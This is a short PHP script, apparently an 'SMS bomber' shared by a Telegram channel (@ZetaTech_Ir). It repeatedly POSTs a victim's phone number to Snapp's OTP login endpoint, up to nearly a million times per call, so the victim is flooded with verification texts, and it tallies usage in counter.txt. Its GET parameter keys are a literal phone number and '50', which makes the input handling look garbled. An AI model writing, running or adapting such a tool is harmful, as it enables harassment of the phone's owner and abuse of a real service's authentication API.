<?php 

 $phone = $_GET['09215840528'];
 $count = $_GET['50'];
 $upp = file_get_contents("counter.txt");
 if(isset($phone) AND isset($count) AND $count<1000000 AND !empty($phone) AND !empty($count))
 {
for ($a=0;$a<$count;$a++){
 
$send = json_encode(['cellphone' =>"$phone"]);
 
     $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://web-api.snapp.ir/api/v1/auth/otp');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json'
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $src = curl_exec($ch);
    if (curl_error($ch)) {
      echo curl_error($ch);
    }
  }
echo "Pm Ersal Shod Channel Ma : @ZetaTech_Ir";
$up = $upp + $count;
file_put_contents("counter.txt",$up);
}else{
 echo "Eshtebah";
 }
?>
